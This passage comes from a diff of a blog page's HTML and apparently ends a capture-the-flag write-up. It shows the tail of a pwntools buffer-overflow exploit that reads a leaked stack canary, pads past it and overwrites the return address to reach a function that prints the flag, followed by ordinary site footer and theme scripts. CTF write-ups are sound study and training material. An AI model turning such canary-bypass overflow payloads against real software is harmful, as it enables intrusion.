+</span></span><span style="display:flex;"><span>canary<span style="color:#f92672">=</span>int(p<span style="color:#f92672">.</span>recvline(),<span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">24</span> <span style="color:#75715e"># Padding</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(canary) <span style="color:#75715e"># Canary value</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">40</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>) <span style="color:#75715e"># Padding again</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(e<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;disablefunction&#39;</span>]) <span style="color:#75715e"># Address of disabled function</span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">2</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">+</span>payload) <span style="color:#75715e"># BOF</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvall()) <span style="color:#75715e"># Get the flag</span>
+</span></span></code></pre></div>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://me.dgidc.ir/b/posts/2/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>HTB Busqueda Machine Writeup</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2023 <a href="https://me.dgidc.ir/b/">D4rkNebula Blog</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
